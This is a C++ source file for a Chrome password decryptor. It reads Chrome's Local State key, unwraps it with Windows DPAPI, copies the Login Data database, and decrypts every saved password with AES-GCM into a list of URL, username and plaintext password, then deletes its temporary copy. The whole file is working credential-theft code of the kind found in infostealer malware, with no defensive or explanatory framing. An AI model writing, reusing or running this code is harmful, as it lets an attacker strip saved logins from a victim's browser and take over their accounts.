#include "ChromePassDecryptor.h"
#include <Windows.h>
#pragma comment(lib, "Crypt32.lib")

#define SQLITE_OK 0

#include <cryptopp/gcm.h>
#include <cryptopp/aes.h>
#include <cryptopp/filters.h>
#include <cryptopp/files.h>
using namespace CryptoPP;

void ChromePassDecryptor::Initialize()
{
	RetrieveEncryptionKey();
}

void ChromePassDecryptor::RetrieveEncryptionKey()
{
	auto LocalStatePath = Utils::get_app_data_path() + "\\Local\\Google\\Chrome\\User Data\\Local State";

	std::ifstream file(LocalStatePath);
	std::string contents((std::istreambuf_iterator<char>(file)),
		std::istreambuf_iterator<char>());

	auto parsed_json = json::parse(contents);
	
	std::string key = parsed_json["os_crypt"]["encrypted_key"];
	key = Utils::base64_decode(key);
	key = key.substr(5);

	DATA_BLOB DataIn;
	DATA_BLOB DataOut;
	BYTE* pbDataInput = (BYTE*)&key[0];
	DWORD cbDataInput = (DWORD)(key.size() + 1);
	DataIn.pbData = pbDataInput;
	DataIn.cbData = cbDataInput;

	if (!CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataOut))
		printf("Failed to retrieve encryption key\n");

	m_EncryptionKey = std::string(reinterpret_cast<char const*>(DataOut.pbData), DataOut.cbData);
}

void ChromePassDecryptor::CopyDB(const char* source, const char* dest)
{
	std::string path = Utils::get_app_data_path() + "\\Local\\";
	path.append("\\Google\\Chrome\\User Data\\Default\\");
	path.append(source);

	std::ifstream  src(path, std::ios::binary);
	std::ofstream  dst(dest, std::ios::binary);
	dst << src.rdbuf();
	dst.close();
	src.close();
}

sqlite3* ChromePassDecryptor::GetDBHandle(const char* dbFilePath)
{
	sqlite3* db;
	int rc = sqlite3_open(dbFilePath, &db);
	if (rc)
	{
		printf("Error opening SQLite3 database\n\n");
		sqlite3_close(db);
		return nullptr;
	}
	else
	{
		return db;
	}
}

void ChromePassDecryptor::GetPasswords(sqlite3* db)
{
	const char* zSql = "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created";
	sqlite3_stmt* pStmt;
	int rc;

	rc = sqlite3_prepare(db, zSql, -1, &pStmt, 0);
	if (rc != SQLITE_OK) {
		std::cout << "statement failed rc = " << rc << std::endl;
		std::cout << sqlite3_errmsg(db) << std::endl;
		return;
	}

	rc = sqlite3_step(pStmt);
	while (rc == SQLITE_ROW) {
		char* url = (char*)sqlite3_column_text(pStmt, 0);
		char* username = (char*)sqlite3_column_text(pStmt, 2);
		BYTE* encryptedPassword = (BYTE*)sqlite3_column_text(pStmt, 3);
		DWORD passwordBytes = sqlite3_column_bytes(pStmt, 3);

		try
		{
			std::string passStr = std::string(reinterpret_cast<char*>(encryptedPassword), passwordBytes);
			auto aes_iv = passStr.substr(3, 12);
			auto aes_password = passStr.substr(15);

			std::string decryptedPassword;

			CryptoPP::GCM<CryptoPP::AES>::Decryption decryptor;
			decryptor.SetKeyWithIV(reinterpret_cast<const byte*>(m_EncryptionKey.c_str()), m_EncryptionKey.size(), reinterpret_cast<const byte*>(aes_iv.c_str()), aes_iv.size());

			AuthenticatedDecryptionFilter df(decryptor, new StringSink(decryptedPassword));
			df.Put(reinterpret_cast<const byte*>(aes_password.c_str()), aes_password.size());
			df.MessageEnd();

			PasswordEntry entry;
			entry.URL = url;
			entry.Username = username;
			entry.Password = decryptedPassword;

			m_PasswordEntries.push_back(entry);
		}
		catch (...) {}

		rc = sqlite3_step(pStmt);
	}

	rc = sqlite3_finalize(pStmt);
}

void ChromePassDecryptor::Run()
{
	CopyDB("Login Data", "passwordsDB");

	auto PasswordDBHandle = GetDBHandle("passwordsDB");

	if (PasswordDBHandle)
		GetPasswords(PasswordDBHandle);

	sqlite3_close(PasswordDBHandle);

	Utils::delete_file("passwordsDB");
}
